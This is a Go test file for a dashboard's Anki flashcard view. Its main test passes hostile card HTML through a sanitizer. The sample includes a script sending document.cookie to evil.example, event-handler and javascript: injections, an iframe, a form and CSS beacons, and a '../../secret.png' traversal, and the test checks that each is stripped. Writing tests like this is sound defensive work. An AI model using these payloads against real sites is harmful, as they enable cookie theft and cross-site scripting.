package web

import (
	"strings"
	"testing"
	"time"

	"dashboard/internal/anki"
)

// A card from a shared deck can carry anything: only what can't run or reach elsewhere stays,
// and the collection's own images and sounds come inline.
func TestCardDocumentKeepsOnlyWhatIsSafe(t *testing.T) {
	media := map[string][]byte{"cat.png": []byte("PNG"), "word.mp3": []byte("MP3"), "notes.txt": []byte("hi")}
	fetch := func(name string) ([]byte, error) { return media[name], nil }
	card := `<div class="front" onclick="steal()">Capital of <b>France</b>?</div>` +
		`<script>fetch("https://evil.example/?"+document.cookie)</script>` +
		`<img src="cat.png" onerror="steal()"><img src="https://evil.example/pixel.gif"><img src="../../secret.png">` +
		`<a href="javascript:steal()">link</a><iframe src="https://evil.example"></iframe>` +
		`<svg><script>steal()</script><circle r="4"/></svg><!-- note -->` +
		`<style>.front{color:red}</style><audio controls data-sound="word.mp3"></audio><audio data-sound="notes.txt"></audio>` +
		`<form action="https://evil.example"><input name="x"></form><div style="background:url(https://evil.example/x)">bg</div>`
	page := string(cardDocument(card, ".card{font-size:20px}</style><script>steal()</script>", 1, fetch))
	head, body, _ := strings.Cut(page, "</head>")
	if strings.Count(head, "</") != 1 { // only the head's own </style>: the CSS can't end it early
		t.Errorf("the note type's CSS closed its <style>:\n%s", head)
	}

	for _, bad := range []string{"<script", "onclick", "onerror", "evil.example", "javascript:", "<iframe", "<form",
		"secret.png", "<!--", "url(", "notes.txt"} {
		if strings.Contains(body, bad) {
			t.Errorf("%q survived:\n%s", bad, body)
		}
	}
	for _, good := range []string{`<body class="card card2">`, "Capital of <b>France</b>?", ".card{font-size:20px}",
		`src="data:image/png;base64,UE5H"`, `src="data:audio/mpeg;base64,TVAz"`, ".front{color:red}", "<circle", "link</a>"} {
		if !strings.Contains(page, good) {
			t.Errorf("%q is missing:\n%s", good, page)
		}
	}
}

func TestCardDocumentCapsInlineMedia(t *testing.T) {
	big := make([]byte, maxInlineFile+1)
	page := string(cardDocument(`<img src="big.png">`, "", 0, func(string) ([]byte, error) { return big, nil }))
	if strings.Contains(page, "data:") {
		t.Error("a file over the limit was inlined")
	}
}

func TestAnkiServerTemplatesRender(t *testing.T) {
	ui := &UI{templates: newTemplateSet("../../web")}
	card := &anki.StudyCard{ID: 17, Reps: 2, Question: "Q", Answer: "A", Buttons: []string{"<1m", "<6m", "<10m", "4d"}}
	study := anki.Study{Deck: "Japanese::Verbs", Counts: [3]int{3, 1, 9}, Card: card}
	server := anki.Status{Connected: true, Server: true}
	cases := []struct {
		name string
		view any
		want string
	}{
		{"anki-review", ankiReviewView{Deck: "Japanese::Verbs", Study: study, Side: "q"}, "Show answer"},
		{"anki-review-panel", ankiReviewView{Deck: "Japanese::Verbs", Study: study, Side: "a"}, "keyup[key=='4']"},
		{"anki-review-panel", ankiReviewView{Deck: "Default", Study: anki.Study{Done: true, Deck: "Default"}}, "Nothing left to study"},
		{"anki-review-panel", ankiReviewView{Problem: "Your Anki on the server couldn't start"}, "couldn&#39;t start"},
		{"anki-decks", ankiDecksView{Server: true, Overview: anki.Overview{Decks: []anki.Deck{{Name: "Default", New: 2}}}}, "/anki/review?deck=Default"},
		{"anki-body", ankiBodyView{Status: anki.Status{Server: true, Problem: "Your Anki on the server couldn't start"}}, "couldn&#39;t start"},
		{"card-anki", ankiTodayView{Status: server, Asleep: true}, "Open the Anki tab"},
		{"card-anki", ankiTodayView{Status: server, Asleep: true, At: time.Now(), Due: 4, Busiest: []anki.Deck{{Name: "Default", Review: 4}}}, "/anki/review?deck=Default"},
		{"connections-card", connectionsView{Anki: server, AnkiOnServer: true}, "AnkiWeb password"},
		{"connections-card", connectionsView{Anki: server, AnkiWeb: anki.ServerStatus{SignedIn: true, Username: "me@example.com"}}, "Sign out of AnkiWeb"},
		{"connections-card", connectionsView{Anki: anki.Status{Connected: true}, AnkiURL: "http://192.168.1.20:8765", AnkiOnServer: true}, "Anki on this server instead"},
	}
	for _, c := range cases {
		page, err := ui.renderToHTML(c.name, c.view)
		if err != nil {
			t.Errorf("%s: %v", c.name, err)
			continue
		}
		if !strings.Contains(string(page), c.want) {
			t.Errorf("%s: %q missing in\n%s", c.name, c.want, page)
		}
	}
	// The review frame points at the card, sandboxed.
	page, _ := ui.renderToHTML("anki-review-panel", ankiReviewView{Deck: "Japanese::Verbs", Study: study, Side: "q"})
	if !strings.Contains(string(page), `<iframe class="review-card" sandbox src="/anki/review/card?deck=Japanese%3A%3AVerbs&amp;id=17&amp;reps=2&amp;side=q"`) {
		t.Errorf("frame: %s", page)
	}
}
